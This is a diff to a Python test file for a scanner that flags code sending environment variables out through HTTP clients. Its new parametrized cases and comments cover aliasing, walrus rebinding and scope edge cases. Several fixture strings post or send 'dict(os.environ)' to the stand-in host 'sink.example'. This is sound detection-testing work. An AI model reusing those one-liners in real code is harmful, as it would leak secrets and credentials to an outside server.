@@ -616,8 +616,10 @@ def test_python_env_dump_exfil_detects_aiohttp_session_sinks(tmp_path: Path, imp
     "setup, call",
     [
         ("conn = http.client.HTTPConnection(host)", "conn.connect()"),
-        ("conn = http.client.HTTPSConnection(host)", "conn.getresponse()"),
+        ("conn = http.client.HTTPConnection(host)", "conn.send(str(dict(os.environ)))"),
+        ("conn = http.client.HTTPSConnection(host)", "conn.send(str(dict(os.environ)))"),
         ("session = requests.Session()", "session.options(host, data=dict(os.environ))"),
+        ("session = requests.Session()", "session.send(prepared_request)"),
         ("pool = urllib3.PoolManager()", "pool.urlopen('POST', host, body=str(dict(os.environ)))"),
         ("session = aiohttp.ClientSession()", "session.patch(host, json=dict(os.environ))"),
     ],
@@ -632,9 +634,12 @@ def test_python_instance_client_uses_constructor_specific_methods(tmp_path: Path
     "setup, call",
     [
         ("conn = http.client.HTTPConnection(host)", "conn.get(host, dict(os.environ))"),
+        ("conn = http.client.HTTPConnection(host)", "conn.getresponse()"),
+        ("conn = http.client.HTTPSConnection(host)", "conn.getresponse()"),
         ("session = requests.Session()", "session.connect()"),
         ("pool = urllib3.PoolManager()", "pool.post(host, dict(os.environ))"),
         ("session = aiohttp.ClientSession()", "session.connect()"),
+        ("session = aiohttp.ClientSession()", "session.send(dict(os.environ))"),
     ],
 )
 def test_python_instance_client_rejects_unsupported_methods(tmp_path: Path, setup: str, call: str) -> None:
@@ -907,11 +912,15 @@ def _runtime_client_receivers(source: str) -> list[str]:
         async def __aexit__(self, *_exc: object) -> bool:
             return False
 
+    client_module = SimpleNamespace(Session=lambda: _Recorder("client"))
+    config_module = SimpleNamespace(Session=lambda: _Recorder("config"))
     namespace = {
         "os": os,
         "host": "http://sink.example",
         "config": _Recorder("config"),
-        "requests": SimpleNamespace(Session=lambda: _Recorder("client")),
+        "configlib": config_module,
+        "r": client_module,
+        "requests": client_module,
         "aiohttp": SimpleNamespace(ClientSession=lambda: _Recorder("client")),
     }
     body = "\n".join(line for line in source.splitlines() if not line.startswith(("import ", "from ")))
@@ -946,6 +955,16 @@ def _scan_reports_client_exfil(tmp_path: Path, source: str) -> bool:
         # The same two statements in the other order really are benign; this is the pair that proves
         # the case above is not passing merely because the name appears somewhere as a client.
         ("import os\nimport requests\n\ns = requests.Session()\ns = config\ns.post(host, json=dict(os.environ))\n", ["config"], False),
+        # Skipping a walrus-bearing assignment invalidates both the walrus target and the ordinary
+        # assignment target; otherwise the latter keeps a stale client handle.
+        ("import os\nimport requests\n\ns = requests.Session()\ns = (x := config)\ns.post(host, json=dict(os.environ))\n", ["config"], False),
+        # An annotation is not analyzed for sinks, but an eagerly evaluated walrus in that annotation
+        # still rebinds the enclosing name and must invalidate its client handle.
+        (
+            "import os\nimport requests\n\ns = requests.Session()\ndef annotated(value: (s := config)):\n    pass\ns.post(host, json=dict(os.environ))\n",
+            ["config"],
+            False,
+        ),
         # A constructor-supported context manager binds the same handle to its simple `as` name.
         ("import os\nimport requests\n\nwith requests.Session() as s:\n    s.post(host, json=dict(os.environ))\n", ["client"], True),
         ("import os\nimport requests\n\nwith config as s:\n    s.post(host, json=dict(os.environ))\n", ["config"], False),
@@ -955,6 +974,20 @@ def _scan_reports_client_exfil(tmp_path: Path, source: str) -> bool:
             "import os\nimport requests\n\nsession = requests.Session()\n\ndef send():\n    session.post(host, json=dict(os.environ))\n\nsession = config\nsend()\n",
             ["config"],
             False,
+        ),
+        # Constructor aliases may cross a scope only while stable in the enclosing scope. A later
+        # rebind changes the global receiver observed when the function actually runs.
+        (
+            "import os\nimport requests as r\n\ndef send():\n    s = r.Session()\n    s.post(host, json=dict(os.environ))\n\nr = configlib\nsend()\n",
+            ["config"],
+            False,
+        ),
+        # The inverse remains in the intended evidence chain: a never-rebound import alias is stable
+        # and can construct a client inside the nested scope.
+        (
+            "import os\nimport requests as r\n\ndef send():\n    s = r.Session()\n    s.post(host, json=dict(os.environ))\n\nsend()\n",
+            ["client"],
+            True,
         ),
     ],
 )
